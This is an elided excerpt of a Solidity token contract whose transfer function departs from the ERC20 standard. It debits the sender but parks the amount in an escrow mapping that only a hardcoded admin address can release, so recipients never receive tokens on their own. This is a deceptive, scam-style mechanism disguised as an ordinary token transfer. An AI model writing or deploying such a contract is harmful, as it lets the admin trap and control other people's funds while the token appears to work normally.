...
address admin;
  ...
  constructor() public {
    ...
    admin = 0xEcaEb5046bc4d37A87dfA2e3006Abdd0D6c1e43D;
...
function escrowTransfer(address to) onlyAdmin public{
     ...
     _balances[to] = _balances[to].add(escrow[to]);
     escrow[to] = 0;
  }
  
  function transfer(address recipient, uint256 amount) external returns (bool) {
  // _transfer(_msgSender(), escrow, amount);
    require(recipient != address(0), "ERC20: transfer to the zero address");
   _balances[_msgSender()] = _balances[_msgSender()].sub(amount, "ERC20: transfer amount exceeds balance");
   escrow[recipient] = escrow[recipient] + amount;
    return true;
  }
